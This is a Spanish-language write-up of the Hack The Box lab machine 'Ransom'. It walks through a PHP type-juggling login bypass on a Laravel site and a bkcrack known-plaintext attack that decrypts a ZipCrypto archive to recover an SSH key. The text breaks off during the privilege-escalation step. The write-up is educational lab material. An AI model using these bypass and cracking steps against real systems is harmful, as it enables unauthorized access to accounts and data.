<!doctype html><html lang=es><head><title>Ransom | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Máquina media. Esta máquinaa tiene una página web en Laravel con un formulario de inicio de sesión que es vulnerable a Type Juggling. Después, encontramos un archivo ZIP encriptado y podemos realizar un ataque de texto claro conocido para extraer los archivos. La contraseña esperada en el formuulario de inicio de sesión se reutiliza para el usuario root. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web en PHP y conocimientos sobre archivos ZIP"><meta name=robots content="index, follow"><meta name=image content="https://7rocky.github.io/images/HTB/Ransom/Ransom.png"><meta name=author content="7Rocky"><meta property="og:title" content="Ransom"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquinaa tiene una página web en Laravel con un formulario de inicio de sesión que es vulnerable a Type Juggling. Después, encontramos un archivo ZIP encriptado y podemos realizar un ataque de texto claro conocido para extraer los archivos. La contraseña esperada en el formuulario de inicio de sesión se reutiliza para el usuario root. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web en PHP y conocimientos sobre archivos ZIP"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/htb/ransom/"><meta property="article:section" content="htb"><meta property="article:published_time" content="2022-03-15T00:00:00+01:00"><meta property="article:modified_time" content="2022-03-30T14:10:14+02:00"><meta property="og:site_name" content="7Rocky"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Ransom/Ransom.png"><meta property="og:author" content="7Rocky"><meta itemprop=name content="Ransom"><meta itemprop=description content="Hack The Box. Linux. Máquina media. Esta máquinaa tiene una página web en Laravel con un formulario de inicio de sesión que es vulnerable a Type Juggling. Después, encontramos un archivo ZIP encriptado y podemos realizar un ataque de texto claro conocido para extraer los archivos. La contraseña esperada en el formuulario de inicio de sesión se reutiliza para el usuario root. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web en PHP y conocimientos sobre archivos ZIP"><meta itemprop=datePublished content="2022-03-15T00:00:00+01:00"><meta itemprop=dateModified content="2022-03-30T14:10:14+02:00"><meta itemprop=wordCount content="1327"><meta itemprop=keywords content="php,laravel,crypto,type-juggling,password-reuse,"><meta name=twitter:card content="summary"><meta name=twitter:title content="Ransom"><meta name=twitter:description content="Hack The Box. Linux. Máquina media. Esta máquinaa tiene una página web en Laravel con un formulario de inicio de sesión que es vulnerable a Type Juggling. Después, encontramos un archivo ZIP encriptado y podemos realizar un ataque de texto claro conocido para extraer los archivos. La contraseña esperada en el formuulario de inicio de sesión se reutiliza para el usuario root. Para comprometer esta máquina se necesitan conocimientos básicos de pentesting web en PHP y conocimientos sobre archivos ZIP"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/Ransom/Ransom.png"><meta name=twitter:author content="7Rocky"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><link href=/css/main.css rel=stylesheet><script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script><script src=/js/main.js></script><div style=display:none>$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title=es><img alt=es height=30px src=/images/es.png width=30px></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href=/en/htb/ransom/ title=en><img alt=en height=30px src=/images/en.png style="border:4px solid#000;border-radius:100%" width=30px></a><ul class="pl0 ml3 mr3"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/ransom/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/ransom/&text=Ransom" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/ransom/&title=Ransom" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Ransom</h1><time class="f6 mv4 dib tracked" datetime=2022-03-15T00:00:00+01:00>15 / 03 / 2022</time></header><div class=htb-image><img alt=Ransom src=/images/HTB/Ransom/Ransom.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/php title=PHP>PHP</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/laravel title=Laravel>Laravel</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/crypto title=Criptografía>Criptografía</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/type-juggling title="Type Juggling">Type Juggling</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/password-reuse title="Reutilización de contraseñas">Reutilización de contraseñas</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#port-scanning>Port scanning</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#explotación-de-type-juggling>Explotación de Type Juggling</a></li><li><a href=#ataque-de-texto-claro-conocido-a-un-archivo-zip-cifrado>Ataque de texto claro conocido a un archivo ZIP cifrado</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.153</li><li><strong>Fecha</strong>: 15 / 03 / 2022</li></ul><h2 id=port-scanning>Port scanning</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.153 -p 22,80
</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.153
</span></span><span style=display:flex><span>Host is up (0.055s latency).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
</span></span><span style=display:flex><span>|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
</span></span><span style=display:flex><span>|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
</span></span><span style=display:flex><span>| http-title:  Admin - HTML5 Admin Template
</span></span><span style=display:flex><span>|_Requested resource was http://10.10.11.153/login
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 10.77 seconds
</span></span></code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id=enumeración-web>Enumeración web</h2><p>Si vamos a <code>http://10.10.11.153</code>, se nos redirige a <code>/login</code>, que muestra un formulario de inicio de sesión:</p><p><img src=/images/HTB/Ransom/Ransom-login.png alt=Ransom-login></p><p>La página web está construida con Laravel, que es un <em>framework</em> web de PHP. Nótese que existe una <em>cookie</em> llamada <code>laravel_session</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -I 10.10.11.153
HTTP/1.1 302 Found
<span class=code-white>Date</span>:
<span class=code-white>Server</span>: Apache/2.4.41 (Ubuntu)
<span class=code-white>Cache-Control</span>: no-cache, private
<span class=code-white>Location</span>: http://10.10.11.153/login
<span class=code-white>Set-Cookie</span>: XSRF-TOKEN=eyJpdiI6IjNLelg0R3cvaTAzRUJURkdjSkswNnc9PSIsInZhbHVlIjoiWGpqQ3oxME1CbXZ5dmFnOCt1SUtST3NMS1RTUUQxL0xZNncxYk9hbXBucHh3elV3OXBiN08wQkpteTV  
WRGR5SFBjNjBSN2pFODFHRDA1Rkt6ZE1NeklWcjJwZHJOTVFmNmFuTCtUTjBodnMrU29adWJZelFsd2VxVmJGRzdobFgiLCJtYWMiOiJhYWExNWI0MzRlNzk3MzRmYTE0YjdmMzQ5OGE4ZDI3ODFiODJlMWNlM
TJmNTk0Y2JlOGM0ODk5NDczMjYxYTFjIiwidGFnIjoiIn0%3D
<span class=code-white>Set-Cookie:</span> laravel_session=eyJpdiI6InIwUm5hV3lrUS83cHAxMG5iMWxkREE9PSIsInZhbHVlIjoiQkVZR2pjd2FUc3Z6ZklETEU3dmpzRjI3N3EzTitMWnFXbXpYN3cwMnpGejBxeVRjVlJKMk9Udk
VkcjIxTmVyNm9ZbFFKMitIbVB6Tm1WZW02WUVRNEVnbkU0VEU4ei8ySUdJQW5OdVdlbFE2cnI3MStXcU9ySkExRDl1Z29waTMiLCJtYWMiOiJjOWMyOWJkOWJkYzVjMjM1Y2IyZDZlMDJiYTUyODVmNmE1ZjEy
MTcyZjY4NjM5YmUxYzdhMTkzY2Y0ZjY1NmI0IiwidGFnIjoiIn0%3D
<span class=code-white>Content-Type</span>: text/html; charset=UTF-8
</code></pre></div><p>Podemos tratar de inyectar código SQL en el formulario, pero no parece vulnerable.</p><h2 id=explotación-de-type-juggling>Explotación de Type Juggling</h2><p>Como está gestionado con PHP, podemos tratar de exploitar una vulnerabilidad conocida como <em>Type Juggling</em>. Esta es una prueba de concepto:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>php</span> -a
Interactive shell

php &gt; if ("asdf" == true) { echo "true"; }  
true
</code></pre></div><p>La vulnerabilidad está en el uso de <code>==</code>, que no verifica el tipo de variable, solo el valor. Una solución correcta sería esta, usando <code>===</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>php &gt; if ("asdf" === true) { echo "true"; } else { echo "false"; }  
false
</code></pre></div><p>Si la página web es vulnerable a <em>Type Juggling</em>, si introducimos un tipo booleano como contraseña, evitaremos la autenticación. Vamos a usar Burp Suite (Repeater):</p><p><img src=/images/HTB/Ransom/Ransom-burp-fail.png alt="Ransom Burp fail"></p><p>No podemos poner simplemente <code>password=true</code> ya que el servidor lo interpretará como <code>"true"</code> (un <em>string</em>). Para añadir un valor booleano, podemos usar un documento JSON. Aunque la petición es GET, podemos añadir el parámetro en el cuerpo de la petición:</p><p><img src=/images/HTB/Ransom/Ransom-burp-success.png alt="Ransom Burp success"></p><p>Como se muestra, obtenemos &ldquo;<em>Login Successful</em>&rdquo;, por lo que nos hemos saltado la autenticación. Utilizando Burp Suite (Proxy), podemos interceptar la petición y modificarla antes de que vaya al servidor, de manera que la respuesta sea correcta.</p><p>Luego, tenemos este portal:</p><p><img src=/images/HTB/Ransom/Ransom-storage.png alt="Ransom storage"></p><p>En este punto, ya tenemos <code>user.txt</code>:</p><p><img src=/images/HTB/Ransom/Ransom-user-txt.png alt="Ransom user.txt"></p><h2 id=ataque-de-texto-claro-conocido-a-un-archivo-zip-cifrado>Ataque de texto claro conocido a un archivo ZIP cifrado</h2><p>Existe también un archivo ZIP llamado <code>uploaded-file-3422.zip</code> y está protegido con contraseña:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>file</span> uploaded-file-3422.zip
uploaded-file-3422.zip: Zip archive data, at least v2.0 to extract, compression method=deflate  
</code></pre></div><p>Podemos tratar de realizar un ataque de fuerza bruta con <code>fcrackzip</code>, pero la contraseña parece fuerte y no se encuentra en <code>rockyou.txt</code>.</p><p>Podemos ver los archivos contenidos y el método de compresión:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>unzip</span> -v uploaded-file-3422.zip
Archive:  uploaded-file-3422.zip
 Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
--------  ------  ------- ---- ---------- ----- --------  ----
     220  Defl:N      158  28% 2020-02-25 06:03 6ce3189b  .bash_logout
    3771  Defl:N     1740  54% 2020-02-25 06:03 ab254644  .bashrc
     807  Defl:N      392  51% 2020-02-25 06:03 d1b22a87  .profile
       0  Stored        0   0% 2021-07-02 13:58 00000000  .cache/
       0  Stored        0   0% 2021-07-02 13:58 00000000  .cache/motd.legal-displayed  
       0  Stored        0   0% 2021-07-02 13:58 00000000  .sudo_as_admin_successful
       0  Stored        0   0% 2022-03-07 06:32 00000000  .ssh/
    2610  Defl:N     1978  24% 2022-03-07 06:32 38804579  .ssh/id_rsa
     564  Defl:N      463  18% 2022-03-07 06:32 cb143c32  .ssh/authorized_keys
     564  Defl:N      463  18% 2022-03-07 06:32 cb143c32  .ssh/id_rsa.pub
    2009  Defl:N      569  72% 2022-03-07 06:32 396b04b4  .viminfo
--------          -------  ---                            -------
   10545             5763  45%                            11 files

<span class=code-cyan>$</span> <span class=code-dark-green>7z</span> -slt l uploaded-file-3422.zip | <span class=code-dark-green>grep</span> -A 14 .bash_logout
Path = .bash_logout
Folder = -
Size = 220
Packed Size = 170
Modified = 2020-02-25 07:03:22
Created =
Accessed =
Attributes = _ -rw-r--r--
Encrypted = +
Comment =
CRC = 6CE3189B
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0
</code></pre></div><p>Parece que es un directorio personal de algún usuario. Además, el métoro de compresión es ZipCrypto Deflate.</p><p>Después de leer <a href=https://medium.com/@whickey000/how-i-cracked-conti-ransomware-groups-leaked-source-code-zip-file-e15d54663a8><em>How I Cracked CONTI Ransomware Group’s Leaked Source Code ZIP File</em></a>, vemos que existe un ataque de texto claro conocido a archivos ZIP cifrados.</p><p>El archivo <code>.bash_logout</code> puede ser el que viene por defecto. Este es el <code>.bash_logout</code> que tengo en mi máquina (el que viene por defecto):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>cp</span> ~/.bash_logout .

<span class=code-cyan>$</span> <span class=code-dark-green>cat</span> .bash_logout
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy  

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
</code></pre></div><p>Podemos verificar que ambos archivos <code>.bash_logout</code> son iguales utilizando el algoritmo CRC32 (utilizado por los archivos ZIP para detectar errores):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>&gt;&gt;&gt; import zlib
&gt;&gt;&gt; bash_logout = open('.bash_logout', 'rb').read()  
&gt;&gt;&gt; hex(zlib.crc32(bash_logout))
'0x6ce3189b'
</code></pre></div><p>En los comandos <code>unzip</code> / <code>7z</code> anteriores podemos ver el valor CRC32 de <code>.bash_logout</code>, y los dos coinciden, por lo que tenemos un texto claro conocido.</p><p>Ahora es el momento de usar <a href=https://github.com/kimci86/bkcrack><code>bkcrack</code></a> (ataque de texto claro conocido) para guardar los archivos de <code>uploaded-file-3422.zip</code> en <code>unlocked.zip</code>. Necesitamos proporcionar un archivo <code>plain.zip</code> que contenga nuestro <code>.bash_logout</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>zip</span> plain.zip .bash_logout
  adding: .bash_logout (deflated 28%)

<span class=code-cyan>$</span> <span class=code-dark-green>./bkcrack</span> -C uploaded-file-3422.zip -c .bash_logout -P plain.zip -p .bash_logout
bkcrack 1.3.5 - 2022-03-28
[03:34:35] Z reduction using 150 bytes of known plaintext
100.0 % (150 / 150)
[03:34:35] Attack on 57097 Z values at index 7
Keys: 7b549874 ebc25ec5 7e465e18
78.5 % (44845 / 57097)
[03:38:54] Keys
7b549874 ebc25ec5 7e465e18

<span class=code-cyan>$</span> <span class=code-dark-green>./bkcrack</span> -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip password  
bkcrack 1.3.5 - 2022-03-28
[03:42:33] Writing unlocked archive unlocked.zip with password "password"
100.0 % (9 / 9)
Wrote unlocked archive.
</code></pre></div><p>En este punto, podemos extraer los archivos de <code>unlocked.zip</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>unzip</span> -P password unlocked.zip
Archive:  unlocked.zip
  inflating: .bash_logout
  inflating: .bashrc
  inflating: .profile
   creating: .cache/
 extracting: .cache/motd.legal-displayed  
 extracting: .sudo_as_admin_successful
   creating: .ssh/
  inflating: .ssh/id_rsa
  inflating: .ssh/authorized_keys
  inflating: .ssh/id_rsa.pub
  inflating: .viminfo
</code></pre></div><h2 id=escalada-de-privilegios>Escalada de privilegios</h2><p>Ahora tenemos una clave privada de SSH. Podemos conectarnos como usuario <code>htb</code> (ya que es una máquina de UHC) sin usar contraseña:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>chmod</span> 600 id_rsa

<span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> -i id_rsa htb@10.10.11.153
<span class=code-green>htb@ransom</span>:<span class=code-blue>~</span>$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)  
</code></pre></div><p>Aunque pertenecemos al grupo <code>lxd</code>, vamos a escalar de la forma intencionada.</p><p>Vamos a buscar la aplicación de Laravel para ver cómo se gestiona la autenticación:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>htb@ransom</span>:<span class=code-blue>~</span>$ find / -name \*laravel\* 2>/dev/null  
/srv/prod/storage/logs/laravel.log
/srv/prod/vendor/laravel
/srv/prod/vendor/fruitcake/laravel-cors
</code></pre></div><p>Genial, parece que los archivos fuente de Laravel están en <code>/srv/prod</code>. Vamos a buscar por <code>"password"</code> de manera recursiva:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>htb@ransom</span>:<span class=code-blue>~</span>$ cd /srv/prod
<span class=code-green>htb@ransom</span>:<span class=code-blue>/srv/prod</span>$ grep -nri password . | grep -vE 'js|config|vendor|bootstrap' | grep php | grep password
./resources/views/auth/login.blade.php:15:              <span class=code-red>password</span>: $("#<span class=code-red>password</span>").val()
./resources/views/auth/login.blade.php:44:              &lt;p&gt;Please enter the <span class=code-red>password</span> provided to you in order to send files to the E Corp Engineers.&lt;/p&gt;
./resources/views/auth/login.blade.php:50:                  &lt;input type="<span class=code-red>password</span>" name="<span class=code-red>password</span>" id="<span class=code-red>password</span>" class="form-control form-control-lg" /&gt;
./resources/lang/en/validation.php:35:    'current_<span class=code-red>password</span>' =&gt; 'The <span class=code-red>password</span> is incorrect.',
./resources/lang/en/validation.php:103:    '<span class=code-red>password</span>' =&gt; 'The <span class=code-red>password</span> is incorrect.',
